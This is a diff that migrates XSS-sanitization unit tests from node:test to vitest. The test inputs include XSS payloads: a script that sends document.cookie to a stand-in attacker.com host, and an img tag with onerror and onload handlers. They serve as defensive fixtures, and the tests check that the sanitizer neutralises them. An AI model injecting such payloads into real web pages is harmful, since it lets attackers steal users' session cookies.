@@ -1,44 +1,43 @@
-import { test, describe } from 'node:test';
-import assert from 'node:assert';
-import { sanitizeHTML, stripDangerousTags } from '../../utils/security.ts';
+import { describe, test, expect } from 'vitest';
+import { sanitizeHTML, stripDangerousTags } from '../../utils/security';
 
 describe('Security - Input Sanitization & XSS Defense', () => {
   test('sanitizeHTML escapes HTML special characters', () => {
     const rawInput = '<script>alert("xss")</script>';
     const sanitized = sanitizeHTML(rawInput);
 
-    assert.strictEqual(sanitized, '&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
-    assert.strictEqual(sanitized.includes('<script>'), false);
+    expect(sanitized).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
+    expect(sanitized.includes('<script>')).toBe(false);
   });
 
   test('sanitizeHTML escapes single quotes, double quotes, and ampersands', () => {
     const input = `Me & My 'Friend' "Saheli"`;
     const sanitized = sanitizeHTML(input);
 
-    assert.strictEqual(sanitized, 'Me &amp; My &#x27;Friend&#x27; &quot;Saheli&quot;');
+    expect(sanitized).toBe('Me &amp; My &#x27;Friend&#x27; &quot;Saheli&quot;');
   });
 
   test('stripDangerousTags removes script and iframe tags completely', () => {
     const maliciousInput = 'Hello <script>fetch("http://attacker.com?cookie=" + document.cookie)</script> world';
     const cleaned = stripDangerousTags(maliciousInput);
 
-    assert.strictEqual(cleaned, 'Hello  world');
-    assert.strictEqual(cleaned.includes('<script>'), false);
+    expect(cleaned).toBe('Hello  world');
+    expect(cleaned.includes('<script>')).toBe(false);
   });
 
   test('stripDangerousTags strips inline javascript event handlers', () => {
     const maliciousInput = '<img src="x" onerror="alert(1)" onload="evil()" />';
     const cleaned = stripDangerousTags(maliciousInput);
 
-    assert.strictEqual(cleaned.includes('onerror='), false);
-    assert.strictEqual(cleaned.includes('onload='), false);
+    expect(cleaned.includes('onerror=')).toBe(false);
+    expect(cleaned.includes('onload=')).toBe(false);
   });
 
   test('handles null and empty input safely without throwing exceptions', () => {
-    assert.strictEqual(sanitizeHTML(''), '');
+    expect(sanitizeHTML('')).toBe('');
     // @ts-expect-error testing null input handling
-    assert.strictEqual(sanitizeHTML(null), '');
+    expect(sanitizeHTML(null)).toBe('');
     // @ts-expect-error testing undefined input handling
-    assert.strictEqual(stripDangerousTags(undefined), '');
+    expect(stripDangerousTags(undefined)).toBe('');
   });
 });
